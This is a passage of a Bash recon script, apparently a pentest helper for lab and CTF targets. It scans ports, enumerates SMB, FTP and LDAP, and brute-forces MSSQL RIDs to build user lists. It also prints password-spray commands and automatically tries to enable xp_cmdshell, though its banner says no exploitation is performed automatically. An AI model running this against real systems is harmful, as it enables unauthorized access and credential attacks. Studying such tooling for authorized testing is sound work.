        note "NetExec exited with status $priv_rc"
    fi

    return 0
}

run_mssql_rid_brute() {
    local auth_mode="$1"
    local auth_label
    local rid_output rid_rows
    local rid domain principal
    local detected_domain=""
    local date_tag users_file spray_command
    local display_command="netexec"
    local arg quoted

    local -a nxc_args=(
        mssql
        "$TARGET_IPV4"
        -u "$AUTH_USER"
        -p "$AUTH_PASS"
    )

    local -a users=()
    local -A seen_users=()
    local -A seen_domains=()

    case "$auth_mode" in
        default)
            auth_label="standard authentication"
            ;;
        local)
            auth_label="local authentication"
            nxc_args+=(--local-auth)
            ;;
        *)
            warn "Unknown MSSQL authentication mode: $auth_mode"
            return 2
            ;;
    esac

    nxc_args+=(--rid-brute)

    # Generate a shell-safe copy/paste command.
    for arg in "${nxc_args[@]}"; do
        printf -v quoted '%q' "$arg"
        display_command+=" $quoted"
    done

    lightbulb "Running MSSQL RID brute using ${auth_label}:"
    printf '        %b%s%b\n' "$GREEN" "$display_command" "$RESET"

    # Preserve output even if NetExec returns a nonzero status.
    if ! rid_output="$(netexec "${nxc_args[@]}" 2>&1)"; then
        :
    fi

    # NetExec marks successful authentication with [+].
    if ! grep -Eq \
        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
        <<< "$rid_output"; then

        warn "MSSQL ${auth_label} failed; RID brute was not authenticated"

        # Show useful NetExec errors without exposing all normal output.
        grep -E '\[-\]|\[!\]|ERROR|Error|error' \
            <<< "$rid_output" >&2 || true

        return 1
    fi

    notify "MSSQL ${auth_label} succeeded"

    # Parse lines in this format:
    #
    #   1606: ANY-DOMAIN\jamie.dunn
    #
    # No domain name is hard-coded.
    rid_rows="$(
        awk '
            /^[[:space:]]*MSSQL[[:space:]]/ {
                line = $0

                # Locate a RID field such as:
                #   1606:
                if (!match(line, /[[:space:]][0-9]+:[[:space:]]+/))
                    next

                rid = substr(line, RSTART, RLENGTH)
                gsub(/[^0-9]/, "", rid)

                # Everything after the RID should be DOMAIN\principal.
                qualified_name = substr(line, RSTART + RLENGTH)

                slash = index(qualified_name, "\\")
                if (!slash)
                    next

                domain = substr(qualified_name, 1, slash - 1)
                name = substr(qualified_name, slash + 1)

                sub(/^[[:space:]]+/, "", domain)
                sub(/[[:space:]]+$/, "", domain)
                sub(/^[[:space:]]+/, "", name)
                sub(/[[:space:]]+$/, "", name)
    
                if (domain != "" && name != "")
                    printf "%s\t%s\t%s\n", rid, domain, name
            }
        ' <<< "$rid_output"
    )"

    if [[ -z "$rid_rows" ]]; then
        warn "RID brute authenticated, but no RID entries were parsed"
        return 1
    fi

    # NetExec's MSSQL RID output does not include SidTypeUser or
    # SidTypeGroup. Build a list of likely users by excluding:
    #
    #   - machine accounts ending with $
    #   - well-known domain group RIDs
    #
    # Custom domain groups can still appear in the resulting list.
    while IFS=$'\t' read -r rid domain principal; do
        [[ -n "$principal" ]] || continue

        # Exclude computer and managed machine-style accounts.
        [[ "$principal" == *'$' ]] && continue

        # Exclude well-known domain group RIDs.
        case "$rid" in
            498|512|513|514|515|516|517|518|519|520|521|522|525|526|527|528|529|553|571|572)
                continue
                ;;
        esac

        seen_domains["$domain"]=1

        if [[ -z "${seen_users[$principal]+x}" ]]; then
            seen_users["$principal"]=1
            users+=("$principal")
        fi
    done <<< "$rid_rows"

    if ((${#users[@]} == 0)); then
        notify "RID brute succeeded, but no likely users remained after filtering"
        return 0
    fi

    # Select the domain dynamically when exactly one domain was found.
    if ((${#seen_domains[@]} == 1)); then
        for domain in "${!seen_domains[@]}"; do
            detected_domain="$domain"
        done

        notify "Discovered domain: ${BYELLOW}${detected_domain}${RESET}"
    else
        warn "RID results contained multiple domains; spray command will omit -d"
    fi

    date_tag="$(date +'%Y%m%d_%H%M%S')"

    users_file="$(
        printf 'users_%s_%s_%s.txt' \
            "${TARGET_IPV4//:/_}" \
            "$auth_mode" \
            "$date_tag"
    )"

    printf '%s\n' "${users[@]}" |
        sort -fu > "$users_file"

    notify "Discovered likely users via MSSQL RID brute:"

    while IFS= read -r principal; do
        printf '      - %b%s%b\n' \
            "$BYELLOW" "$principal" "$RESET"
    done < "$users_file"

    note "User candidate list saved to: ${GREEN}${users_file}${RESET}"

    note "NetExec did not return SID object types; validate custom groups with LDAP before spraying."

    lightbulb "Maybe try a password spray if you know an approved default password:"

    lightbulb "   ${YELLOW}Copy/Paste:${RESET}"

    # Build the spray command using the dynamically discovered domain.
    if [[ -n "$detected_domain" ]]; then
        printf -v spray_command \
            'netexec smb %q -u %q -p %q -d %q --continue-on-success' \
            "$TARGET_IPV4" "$users_file" '<ADefaultPassword>' "$detected_domain"
    else
        printf -v spray_command \
            'netexec smb %q -u %q -p %q --continue-on-success' \
            "$TARGET_IPV4" "$users_file" '<ADefaultPassword>'
    fi

    printf '        %b%s%b\n' \
        "$GREEN" "$spray_command" "$RESET"

    record_command "SMB" "Auth Discovery - Password Spray" "$spray_command"

    printf '%s\n' "KERBEROS" "LDAP" >> "$HINT_FILE"

    case "$auth_mode" in
        default)
            MSSQL_RIDBRUTE_OK=true
            ;;
        local)
            MSSQL_RIDBRUTE_LCLAUTH_OK=true
            ;;
    esac
}

run_mssql_cmdshell_check() {
    local auth_mode="$1"
    local auth_label
    local cmdshell_output clean_output
    local cmdshell_rc=0
    local cmdshell_command="netexec"
    local quoted arg

    local -a cmdshell_args=(
        mssql
        "$TARGET_IPV4"
        -u "$AUTH_USER"
        -p "$AUTH_PASS"
    )

    case "$auth_mode" in
        default)
            auth_label="default/domain authentication"
            ;;

        local)
            auth_label="local authentication"
            cmdshell_args+=(--local-auth)
            ;;

        *)
            warn "Unknown MSSQL authentication mode: $auth_mode"
            return 2
            ;;
    esac

    cmdshell_args+=(
        -M enable_cmdshell
        -o ACTION=enable
    )

    for arg in "${cmdshell_args[@]}"; do
        printf -v quoted '%q' "$arg"
        cmdshell_command+=" $quoted"
    done

    lightbulb "Checking whether xp_cmdshell can be enabled:"
    printf '        %b%s%b\n' \
        "$GREEN" "$cmdshell_command" "$RESET"

    record_command \
        "MSSQL" \
        "Privilege Escalation - Enable xp_cmdshell" \
        "$cmdshell_command"

    MSSQL_CMDSHELL_ENABLE_ATTEMPTED=true

    if cmdshell_output="$(netexec "${cmdshell_args[@]}" 2>&1)"; then
        cmdshell_rc=0
    else
        cmdshell_rc=$?
    fi

    # Remove ANSI escape sequences before parsing.
    clean_output="$(
        sed $'s/\033\\[[0-9;]*m//g' <<< "$cmdshell_output"
    )"

    # Display only the module result, not the authentication line that
    # contains the supplied password.
    grep -Ei \
        'xp_cmdshell|RECONFIGURE|ENABLE_CMD|ENABLE_C' \
        <<< "$clean_output" || true

    # Ensure this particular invocation authenticated successfully.
    if ! grep -Eq \
        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
        <<< "$clean_output"; then

        warn \
            "MSSQL ${auth_label} failed during the xp_cmdshell check"

        [[ "$cmdshell_rc" -ne 0 ]] &&
            note "NetExec exited with status $cmdshell_rc"

        return 1
    fi

    MSSQL_CMDSHELL_CHECKED=true

    # Handle permission errors before checking generic success strings.
    if grep -Eqi \
        'You do not have permission to run the RECONFIGURE statement|permission denied.*RECONFIGURE|Failed to enable xp_cmdshell:.*permission' \
        <<< "$clean_output"; then

        MSSQL_CMDSHELL_PERMISSION_DENIED=true
        MSSQL_CMDSHELL_ENABLE_FAILED=true

        MSSQL_CMDSHELL_ERROR="$(
            sed -n \
                's/^.*Failed to enable xp_cmdshell:[[:space:]]*//p' \
                <<< "$clean_output" |
                head -n 1
        )"

        warn \
            "xp_cmdshell could not be enabled: the SQL login cannot run RECONFIGURE"

        note \
            "Valid MSSQL authentication does not imply CONTROL SERVER or sysadmin privileges"

        return 0
    fi

    if grep -Eqi \
        'xp_cmdshell.*already enabled|xp_cmdshell is enabled already' \
        <<< "$clean_output"; then

        MSSQL_CMDSHELL_ALREADY_ENABLED=true
        MSSQL_CMDSHELL_ENABLE_OK=true

        critical "xp_cmdshell was already enabled"
        return 0
    fi

    if grep -Eqi \
        '\[\+\].*(successfully enabled xp_cmdshell|xp_cmdshell.*enabled)|successfully enabled xp_cmdshell' \
        <<< "$clean_output"; then

        MSSQL_CMDSHELL_ENABLE_OK=true

        critical \
            "xp_cmdshell was successfully enabled using ${auth_label}"

        return 0
    fi

    if grep -Eqi \
        'Failed to enable xp_cmdshell|could not enable xp_cmdshell|unable to enable xp_cmdshell' \
        <<< "$clean_output"; then

        MSSQL_CMDSHELL_ENABLE_FAILED=true

        MSSQL_CMDSHELL_ERROR="$(
            sed -n \
                's/^.*Failed to enable xp_cmdshell:[[:space:]]*//p' \
                <<< "$clean_output" |
                head -n 1
        )"

        warn "Failed to enable xp_cmdshell"

        if [[ -n "$MSSQL_CMDSHELL_ERROR" ]]; then
            note "Reason: $MSSQL_CMDSHELL_ERROR"
        fi

        return 0
    fi

    warn \
        "xp_cmdshell module completed, but its result could not be classified"

    [[ "$cmdshell_rc" -ne 0 ]] &&
        note "NetExec exited with status $cmdshell_rc"

    return 0
}

# --------- After port scanning completes ----------
OPEN_PORTS=()   # Will store open ports

# =========================================================
# ================= SCRIPT START ==========================
# =========================================================
echo
echo -e "${BLUE}========================================${RESET}"
echo -e "${BLUE} Educational Recon Mode ${RESET}"
echo -e "${BLUE}----------------------------------------${RESET}"
echo "  • Authorized environments only (training & lab)"
echo "  • No exploitation performed automatically"
echo "  • Output provides learning-oriented next steps"
echo -e "${BLUE}========================================${RESET}"

if [ -n "$AUTH_USER" ] && [ -n "$AUTH_PASS" ]; then
    CREDS_PROVIDED=true
    success "Credentials provided for authenticated checks"
    echo -e "   - User:      ${YELLOW}$AUTH_USER${RESET}"
    echo -e "   - Password:  ${YELLOW}$AUTH_PASS${RESET}"
    if [ -n "$AUTH_DOMAIN" ] ; then
        echo -e "   - Domain:    ${YELLOW}$AUTH_DOMAIN${RESET}"
    fi
    echo
fi

resolve_hostname_to_ip "$TARGET"
init_artifacts
record_command "Invocation" "Repeat this script run" "bash $0 ${*}"

# --------- Function to Scan a Single Port ----------
# ---------- PORT SCAN LOOP ----------
echo -e "\n${BLUE}========================================${RESET}"
echo -e "${BYELLOW}        Running Port Scan     ${RESET}"
echo -e "${BLUE}========================================${RESET}"
for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
    while (( $(jobs -rp | wc -l) >= MAX_JOBS )); do
        sleep 0.05
    done
(
    IFS=: read PORT SERVICE LEVEL <<< "$ENTRY"
    timeout 2 bash -c "echo >/dev/tcp/$TARGET_IPV4/$PORT" 2>/dev/null || exit
    
    #Add Port to Open Ports Array
    #OPEN_PORTS+=("$PORT")
    echo "$PORT" >> "$OPEN_PORTS_FILE"
    
    case "$LEVEL" in
        high) COLOR=$RED ;;
        interesting) COLOR=$YELLOW ;;
        *) COLOR=$GREEN ;;
    esac

    #echo -e "${COLOR}[+] Port $PORT OPEN ($SERVICE)${RESET}"
    success "Port $PORT OPEN ($SERVICE)"
    

    case "$PORT" in
        80|8080|3000|5000) echo http >> "$HTTP_MARKER" ;;
        443|8443) echo https >> "$HTTPS_MARKER" ;;
        21) echo "FTP" >> "$HINT_FILE" ;;
        139|445) echo "SMB" >> "$HINT_FILE"; echo "$PORT" >> "$SMB_MARKER" ;;
        88) echo "KERBEROS" >> "$HINT_FILE" ; echo "$PORT" >> "$KERB_MARKER" ;;
        389|636) echo "LDAP" >> "$HINT_FILE" ; echo "$PORT" >> "$LDAP_MARKER" ;;
        6379) echo "REDIS" >> "$HINT_FILE" ;;
        2049) echo "NFS" >> "$HINT_FILE" ;;
        2375) echo "DOCKER" >> "$HINT_FILE" ;;
        6443) echo "K8S" >> "$HINT_FILE" ;;
        3389) echo "RDP" >> "$HINT_FILE" ;;
        5985) echo "WINRM" >> "$HINT_FILE" ;;
        3306|1433) echo "DB" >> "$HINT_FILE" ;;
        80|443|8080|8443) echo "WEB" >> "$HINT_FILE" ;;
    esac

    # HTTP Redirect Discovery
    if [[ "$PORT" =~ ^(80|8080|3000)$ ]] && command -v curl >/dev/null; then
        redirect=$(curl -sI --max-time 3 "http://$TARGET_IPV4:$PORT" \
            | awk -F': ' 'tolower($1)=="location"{print $2}' | tr -d '\r')

        if [ -n "$redirect" ]; then
            if [[ "$redirect" =~ ^(https?:)?// ]]; then
                host=$(echo "$redirect" | sed -E 's#^(https?:)?//([^/]+).*#\2#')
                echo "$TARGET $host" >> "$HOSTS_FILE"
                echo "$host" >> "$REDIRECT_HOSTS"
                echo -e "${YELLOW}[i] HTTP redirect → $redirect${RESET}"
            fi
        fi
    fi
    
    # -------- LDAP / LDAPS Domain Detection --------
    if [[ "$PORT" == "389" || "$PORT" == "636" ]] && command -v ldapsearch >/dev/null; then
        
        info "Querying LDAP RootDSE..."

        if [ "$PORT" = "389" ]; then
		LDAP_URI="ldap://$TARGET_IPV4"
        else
		LDAP_URI="ldaps://$TARGET_IPV4"
        fi

        ldap_dn=$(
		ldapsearch -x -H "$LDAP_URI" -s base -b "" defaultNamingContext 2>/dev/null \
		| sed -n 's/^defaultNamingContext:[[:space:]]*//p'
	    )

        if [[ "$ldap_dn" =~ ^DC= ]]; then
		LDAP_DOMAIN=$(echo "$ldap_dn" | sed 's/DC=//g; s/,/./g' | tr '[:upper:]' '[:lower:]')
		note "LDAP domain detected: ${GREEN}$LDAP_DOMAIN${RESET}"

		echo "$TARGET $LDAP_DOMAIN" >> "$HOSTS_FILE"
		echo "$LDAP_DOMAIN" >> "$DISCOVERED_HOSTS"
		echo "LDAP" >> "$HINT_FILE"
		echo "KERBEROS" >> "$HINT_FILE"
        else
		info "LDAP service present/open but DOMAIN not disclosed"
        fi
    fi


    if [ "$PORT" = "6379" ] && command -v redis-cli >/dev/null; then
        if redis-cli -h "$TARGET_IPV4" ping 2>/dev/null | grep -qi PONG; then
        	critical "Redis unauthenticated"
	fi
    fi

    if [ "$PORT" = "2375" ] && command -v curl >/dev/null; then
        if curl -s "http://$TARGET_IPV4:2375/containers/json" | grep -q '^\['; then
        	critical "Unauthenticated Docker API (CVE-2025-9074)"
	fi
    fi
) &
done

wait

HAS_SMB=$(grep -q SMB "$HINT_FILE" && echo 1 || echo 0)
HAS_LDAP=$(grep -q LDAP "$HINT_FILE" && echo 1 || echo 0)
HAS_KERB=$(grep -q KERBEROS "$HINT_FILE" && echo 1 || echo 0)

# --------- Reconstruct OPEN_PORTS safely ----------
OPEN_PORTS=()
if [ -s "$OPEN_PORTS_FILE" ]; then
    mapfile -t OPEN_PORTS < <(sort -n "$OPEN_PORTS_FILE")
fi

# --------- Optional Service / Version / OS Detection ----------
if [ "$ENABLE_SERVICE_DETECT" = true ]; then
    service_version_detection "$TARGET_IPV4"
fi

# --------- Define LDAP_DOMAIN ----------
echo
if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "389"; then
        LDAP_URI="ldap://$TARGET"
    elif printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "636"; then
	LDAP_URI="ldaps://$TARGET"
    fi
    ldap_dn=$(
         ldapsearch -x -H "$LDAP_URI" -s base -b "" defaultNamingContext 2>/dev/null \
         | sed -n 's/^defaultNamingContext:[[:space:]]*//p'
     )
     
     if [ -n "$LDAP_DOMAIN" ]; then
        info "LDAP_DOMAIN is already set: ${BLUE}'${LDAP_DOMAIN}'${RESET}"
     else
        info "LDAP_DOMAIN not set yet."
     fi
     
     if [[ "$ldap_dn" =~ ^DC= ]]; then
        LDAP_DOMAIN=$(echo "$ldap_dn" | sed 's/DC=//g; s/,/./g' | tr '[:upper:]' '[:lower:]')
        info "LDAP service present/open. DOMAIN is disclosed: ${BLUE}$LDAP_DOMAIN${RESET}"
     else
     	info "LDAP service present/open but DOMAIN not disclosed"
     fi
fi

# --------- Debug / Visibility ----------
if [ "${#OPEN_PORTS[@]}" -gt 0 ]; then
    echo
    
    info "This is a simple port scan, make sure you check for all available ports!"
    echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "           ${GREEN}nmap -p- --min-rate=8000 $TARGET_IPV4 | grep --color=always -E 'open|filtered|closed|^|$'${RESET}"
    record_command "Discovery" "Full TCP port sweep" "nmap -p- --min-rate=8000 $TARGET_IPV4 | grep --color=always -E 'open|filtered|closed|^|$'"
    
    echo
    info "Open ports detected: ${OPEN_PORTS[*]}"
    echo
    info "CVE / Attack Surface Hints:"
    for port in "${OPEN_PORTS[@]}"; do
        print_cve_hint "$port"
    done
else
    warn "No open ports detected"
fi

echo -e "\n${BLUE}========================================${RESET}"

echo -e "\n${BLUE}========================================${RESET}"
echo -e "${BYELLOW}  Post-Scan Service Exposure Checks ${RESET}"
echo -e "${BLUE}========================================${RESET}"

if [ "${#OPEN_PORTS[@]}" -gt 0 ]; then
    for port in "${OPEN_PORTS[@]}"; do
        if [ "$port" -eq 443 ] || [ "$port" -eq 636 ] || [ "$port" -eq 8443 ]; then
            extract_ssl_info "$TARGET" "$port"
        fi
    done
fi

# --------- DNS Checks (post-scan) ----------
if grep -qx "53" "$OPEN_PORTS_FILE" 2>/dev/null; then
    DNS_FOUND=true
    success "Port 53 OPEN (DNS)"

    if [[ "$ENABLE_DNS_ENUM" == true ]]; then
        dns_enum "$TARGET_IPV4" "$DNS_DOMAIN"
        record_command "Discovery" "DNS Enumeration" "dns_enum $TARGET_IPV4 $DNS_DOMAIN"
    else
        alert "${BLUE}Tip:${RESET} DNS Service detected"
        info "    — add ${BLUE}--dns-enum${RESET} to enable DNS deeper enum"
        info "    — add ${BLUE}--dns-enum --dns-domain example.htb${RESET} "
        info "    — add ${BLUE}--dns-brute --dns-domain example.htb${RESET} "
        echo
    fi
fi

# --------- FTP Checks (post-scan) ----------
if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "21"; then
    echo
    info "FTP detected — running checks"

    # --- Anonymous check ---
    FTP_OUT_1=$(
        printf 'user anonymous anonymous\nquit\n' \
            | timeout 5 ftp -inv "$TARGET_IPV4" 2>&1 \
            | tr -d '\r'
    )
    if printf '%s\n' "$FTP_OUT_1" | grep -qi '^230'; then
        critical "Anonymous FTP login allowed"
        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "           ${GREEN}ftp anonymous@$TARGET_IPV4${RESET}"
        record_command "FTP" "Anonymous Discovery" "ftp anonymous@$TARGET_IPV4"
        FTP_ANON_OK=true
    else
        notify "Anonymous FTP login not permitted"
    fi

    # --- Authenticated check (only if creds provided) ---
    if $CREDS_PROVIDED; then
        ftp_auth_check "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
    fi
fi

# --------- Debug / Visibility ----------
check_rpc_services "$TARGET_IPV4"

# --------- NFS Enumeration (111/RPCBind or 2049/NFS) ----------
if printf '%s\n' "${OPEN_PORTS[@]}" | grep -Eq '^(111|2049)$'; then
    enumerate_nfs "$TARGET_IPV4"
fi

# --------- SMB Enumeration (only if 139 or 445 is open) ----------
if [ -s "$SMB_MARKER" ]; then
    echo
    info "SMB ports detected (139/445) — enumerating shares & permissions..."

    check_smb_protocols "$TARGET_IPV4"
    check_ntlm_support "$TARGET_IPV4"

    SMB_ENUM_SUCCESS=false

    color_perm() {
        local val="$1"
        if [ "$val" = "yes" ]; then
            echo -e "${GREEN}yes${RESET}"
        else
            echo -e "${RED}no${RESET}"
        fi
    }
    
    highlight_keywords() {
        sed -E \
            -e "s/(password|passwd|pwd)/${RED}\1${RESET}/Ig" \
            -e "s/(backup|bak|old)/${RED}\1${RESET}/Ig" \
            -e "s/(\.kdbx)/${RED}\1${RESET}/Ig" \
            -e "s/(\.xlsx)/${RED}\1${RESET}/Ig"
    }
    
    smb_auth_check() {
        local AUTH="$1"
        local SMB_VER_ARG=""

        # Prefer highest supported SMB version
        if $SMB_V3; then
            SMB_VER_ARG="-m SMB3"
        elif $SMB_V2; then
            SMB_VER_ARG="-m SMB2"
        elif $SMB_V1; then
            SMB_VER_ARG="-m NT1"  # NT1 is the alias for SMBv1 in smbclient
        else
            warn "No supported SMB version detected — falling back to default"
            SMB_VER_ARG="-m SMB3"
        fi
        
        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
	echo -e "           ${GREEN}smbclient -L '//$TARGET_IPV4' -U '$AUTH' $SMB_VER_ARG -c 'exit'${RESET}"
	record_command "SMB" "Anonymous Discovery" "smbclient -L '//$TARGET_IPV4' -U '$AUTH' $SMB_VER_ARG -c 'exit'"
        
        # Capture smbclient output
        local OUT
        OUT=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" $SMB_VER_ARG -c 'exit' 2>&1)

        # NTLM disabled = return failure (do NOT treat as special case externally)
        if echo "$OUT" | grep -q "NT_STATUS_NOT_SUPPORTED"; then
            # Optionally log for debugging
            echo -e "        ${YELLOW}(NTLM disabled: NT_STATUS_NOT_SUPPORTED)${RESET}" >&2
            NTLM_ENABLED=false
			print_ntlm_kerberos_time_sync_note "$TARGET_IPV4"
            # Check for valid Kerberos 
            if [ -n "$ORIGINAL_HOSTNAME" ]; then
                echo -e "        ${BLUE}(Attempting Kerberos fallback via netexec smb -k)${RESET}"
                echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
                if [[ "$AUTH" == "%" ]]; then
                    #echo "Null  SMB auth"
                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u '' -p '' -k${RESET}"
                    record_command "SMB" "Anonymous Discovery - Kerberos" "netexec smb $TARGET_IPV4 -u '' -p '' -k"
                    OUT=$(netexec smb "$TARGET_IPV4" -k --shares 2>&1)
                elif [[ "$AUTH" == "guest%" ]]; then
                    #echo "Guest SMB auth" 
                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u 'guest' -p '' -k${RESET}"
                    record_command "SMB" "Guest Discovery - Kerberos" "netexec smb $TARGET_IPV4 -u 'guest' -p '' -k"
                    OUT=$(netexec smb "$TARGET_IPV4" -u "guest" -p "" -k 2>&1)
                else
                    #echo "User|Pass SMB auth"
                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS' -k ${RESET}"
                    record_command "SMB" "Auth Discovery - Kerberos" "netexec smb $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS' -k"
                    OUT=$(netexec smb "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" -k 2>&1)
                fi
                
                if echo "$OUT" | grep -qP '\[\+\]'; then
                    success "Kerberos SMB auth succeeded via netexec!"
                    #echo "$OUT" | grep -E '^\s*SMB\s+.*\[\+\]' | head -n 5
                    return 0
                fi
            fi
        fi

        # Success = "Sharename" appears
        if echo "$OUT" | grep -q "Sharename"; then
            return 0
        fi

        # Any other failure
        return 1
        
        # Try listing shares with the chosen protocol version
        #smbclient -L "//$TARGET_IPV4" -U "$AUTH" $SMB_VER_ARG -c 'exit' >/dev/null 2>&1
        #return $?
    }

    smb_list_files() {
        local SHARE="$1"
        local AUTH="$2"
        local LABEL="$3"

        echo -e "        ${BLUE}$ICON_SHARE Listing files in //$TARGET_IPV4/$SHARE ($LABEL, read-only)${RESET}"
	
	# ---- NEW: Copy-paste helper ----
        local USER="${AUTH%%%*}"
        local PASS="${AUTH#*%}"

        if [ -z "$USER" ]; then
            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -N"
        elif [ -z "$PASS" ]; then
            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -U $USER"
        else
            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -U '$USER%$PASS'"
        fi

        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "           ${GREEN}$COPY_CMD${RESET}"
	echo -e "           ${GREEN}$COPY_CMD -c 'prompt OFF; recurse ON; mget *'${RESET}"
	record_command "SMB" "Discovery" "$COPY_CMD -c 'prompt OFF; recurse ON; mget *'"
        # Root listing first (most reliable)
        ROOT_LIST=$(timeout 6 smbclient "//$TARGET_IPV4/$SHARE" -U "$AUTH" \
             -c "ls" 2>/dev/null)

        if echo "$ROOT_LIST" | grep -q 'NT_STATUS'; then
            echo -e "          ${YELLOW}(directory listing restricted)${RESET}"
            return
        fi

        echo -e "$ROOT_LIST" \
            | awk '
                /blocks of size/ {next}
                /NT_STATUS/ {next}
                NF {print "          - "$0}
            ' #\
            #| highlight_keywords

        # Loot detection
        if echo "$ROOT_LIST" | grep -Eqi '(password|passwd|pwd|backup|\.kdbx|\.xlsx)'; then
            critical "        High-value files detected in //$TARGET_IPV4/$SHARE"
        fi

        # Optional shallow recursion (safe)
        SUBDIRS=$(echo "$ROOT_LIST" | awk '$1 ~ /^d/ {print $NF}')

        for dir in $SUBDIRS; do
            echo -e "          ${BLUE}↳ $dir/${RESET}"
            timeout 4 smbclient "//$TARGET_IPV4/$SHARE" -U "$AUTH" \
                -c "cd \"$dir\"; ls" 2>/dev/null \
                | awk '
                    /blocks of size/ {next}
                    /NT_STATUS/ {next}
                    NF {print}
                ' \
                | sed 's/^/            - /'
        done
    }

    # -------- smbclient enumeration (NULL + GUEST explicitly) --------
    smb_enum_smbclient() {
        local AUTH="$1" # User
        local LABEL="$2"

        #SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null \
        #    | awk '$2 == "Disk" { print $1 }')
        SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null | awk '
        {
            if ($2 == "Disk") { 
                print $1  
            }else if ($3 == "Disk") { 
                print $1 " " $2  
            }else if ($4 == "Disk") { 
                print $1 " " $2 " " $3 
            }
        }')
        
        [ -z "$SHARES" ] && return 1

        critical "  SMB allows $LABEL access"
        notify "   $ICON_SHARE SMB shares ($LABEL):"

        #for share in $SHARES; do
        while IFS= read -r share; do
            [[ "$share" =~ ^(IPC\$|ADMIN\$)$ ]] && continue

            smbclient "//$TARGET_IPV4/$share" -U "$AUTH" -c "ls" >/dev/null 2>&1 \
                && READ="yes" || READ="no"

            smbclient "//$TARGET_IPV4/$share" -U "$AUTH" -c "put /dev/null test_$$_tmp" >/dev/null 2>&1 \
                && WRITE="yes" || WRITE="no"

            echo -e "      - $share [read=$(color_perm "$READ") write=$(color_perm "$WRITE")]"
            if [ "$READ" = "yes" ]; then
            	# Read Share Contents - List Files.
            	#echo "     [DEBUG] smb_enum_smbclient()"
   		smb_list_files "$share" "$AUTH" "$LABEL"
	    fi
        #done
        done <<< "$SHARES"

        SMB_ENUM_SUCCESS=true
        [ "$LABEL" = "NULL session" ] && SMB_NULL_OK=true
        [ "$LABEL" = "GUEST" ] && SMB_GUEST_OK=true
    }
    
    smb_enum_netexec() {
        local SMB_USER="$1"
        local SMB_PASS="$2"
        local SMB_LABEL="$3"
        local AUTH_FLAGS=""
        local OUT

        # Build netexec command flags
        if [[ "$SMB_LABEL" == "NULL session" ]]; then
            AUTH_FLAGS="-k --shares"
            CMD="netexec smb '$TARGET_IPV4' $AUTH_FLAGS"
        elif [[ "$SMB_LABEL" == "GUEST" ]]; then
            AUTH_FLAGS="-u guest -p '' -k --shares"
            CMD="netexec smb '$TARGET_IPV4' -k --shares"
        elif [[ "$SMB_LABEL" == "AUTHENTICATED" ]]; then
            AUTH_FLAGS="-u '$SMB_USER' -p '$SMB_PASS' -k --shares"
            CMD="netexec smb '$TARGET_IPV4' $AUTH_FLAGS"
        else
            return 1
        fi

        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "           ${GREEN}$CMD${RESET}"

        # Run and capture netexec output
        OUT=$(eval "$CMD" 2>/dev/null)

        # Did authentication succeed?
        if echo "$OUT" | grep -qP '\[\+\] .*\\.*:'; then
            success "SMB authentication successful"
        fi

        # Did shares get enumerated?
        if echo "$OUT" | grep -qP '\[\*\] Enumerated shares'; then
            critical "  SMB allows $SMB_LABEL access"
            notify "   $ICON_SHARE SMB shares ($SMB_LABEL):"

            # Filter out only meaningful shares (non IPC$, ADMIN$)
            # Filter and parse meaningful shares (non IPC$, ADMIN$)
            

            if echo "$OUT" | grep -qP 'Share'; then
                echo "$OUT" | tail -n +4
                echo
                notify "   Kerberos was used!"
                echo -e "     Use 'impacket-smbclient' to view files."
                echo -e "         ${GREEN}impacket-smbclient -k ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$SMB_USER:'$SMB_PASS'@$DOMAIN_CONTROLLER${RESET}"
                record_command "SMB" "Auth Discovery - Kerberos" "impacket-smbclient -k ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$SMB_USER:'$SMB_PASS'@$DOMAIN_CONTROLLER"
                echo
            else
                warn "Authenticated but no shares are visible to this user"
            fi

            SMB_ENUM_SUCCESS=true
            [[ "$SMB_LABEL" == "NULL session" ]] && SMB_NULL_OK=true
            [[ "$SMB_LABEL" == "GUEST" ]] && SMB_GUEST_OK=true
        else
            warn "  No SMB shares found using $SMB_LABEL credentials"
            return 1
        fi
        return 0
    }
    
    # -------- smbmap fallback --------
    smb_enum_smbmap() {
        local LABEL="$1" # User
        local SMBMAP_ARGS="$2"

        command -v smbmap >/dev/null 2>&1 || return 1

        OUTPUT=$(smbmap -H "$TARGET_IPV4" $SMBMAP_ARGS 2>/dev/null \
            | awk '
                /^[A-Za-z0-9_$-]+[[:space:]]+(READ|WRITE|READ,WRITE|NO)/ {
                    print $1, $2
                }
            ')

        [ -z "$OUTPUT" ] && return 1

        critical "  SMB allows $LABEL access"
        notify "  $ICON_SHARE SMB shares ($LABEL):"

        echo "$OUTPUT" | while read -r share perms; do
            [[ "$share" =~ ^(IPC\$|ADMIN\$)$ ]] && continue

            perms=$(echo "$perms" | tr '[:upper:]' '[:lower:]')
            [[ "$perms" =~ read ]] && READ="yes" || READ="no"
            [[ "$perms" =~ write ]] && WRITE="yes" || WRITE="no"
	    
